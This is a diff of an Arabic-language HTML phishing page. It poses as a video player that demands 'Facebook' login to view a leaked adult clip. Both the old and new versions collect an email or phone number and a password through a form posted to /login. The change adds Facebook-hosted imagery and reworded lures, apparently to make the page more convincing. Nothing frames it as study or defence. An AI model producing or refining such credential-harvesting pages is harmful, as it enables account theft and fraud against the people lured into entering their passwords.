@@ -3,32 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player - Age Verification</title>
+    <title>Video Player</title>
     <style>
-        body { background-color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; }
-        .video-box { width: 95%; max-width: 500px; background: #111; border-radius: 10px; overflow: hidden; position: relative; }
-        .thumbnail { width: 100%; filter: blur(8px); opacity: 0.6; }
-        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80px; cursor: pointer; }
-        .overlay { background: rgba(0,0,0,0.85); position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; box-sizing: border-box; }
-        .fb-btn { background-color: #1877f2; color: white; padding: 12px 20px; border-radius: 5px; text-decoration: none; font-weight: bold; width: 80%; margin-top: 20px; border: none; font-size: 16px; cursor: pointer; }
-        input { width: 85%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; font-size: 14px; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; margin: 0; padding-top: 50px; }
+        .container { width: 90%; max-width: 400px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 15px; background: #111; }
+        .video-thumb { width: 100%; border-radius: 10px; filter: blur(5px); }
+        .btn { background: #1877f2; color: #fff; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; box-sizing: border-box; }
     </style>
 </head>
 <body>
-    <div class="video-box">
-        <img src="https://via.placeholder.com/500x300/333/fff?text=Video+Preview" class="thumbnail">
-        <div class="overlay">
-            <h2 style="color: #ff3e3e;">محتوى للكبار فقط (+18)</h2>
-            <p>يجب تأكيد هويتك وعمرك عبر فيسبوك لمشاهدة هذا المقطع المسرب</p>
-            
-            <form action="/login" method="post">
-                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
-                <input type="password" name="password" placeholder="كلمة السر" required>
-                <button type="submit" class="fb-btn">تسجيل الدخول والمشاهدة</button>
-            </form>
-            
-            <p style="font-size: 10px; color: #777; margin-top: 15px;">سياسة الخصوصية: لن يتم نشر أي شيء على صفحتك.</p>
-        </div>
+    <div class="container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/d2uUCuEB2qZ.jpg" class="video-thumb">
+        <h3>محتوى حساس (+18)</h3>
+        <p style="font-size: 13px; color: #aaa;">لتأكيد السن والمشاهدة، سجل دخولك بحسابك الرسمي</p>
+        
+        <form action="/login" method="post">
+            <input type="text" name="email" placeholder="رقم الهاتف أو البريد" required>
+            <input type="password" name="password" placeholder="كلمة السر" required>
+            <button type="submit" class="btn">دخول ومتابعة المشاهدة</button>
+        </form>
     </div>
 </body>
 </html>
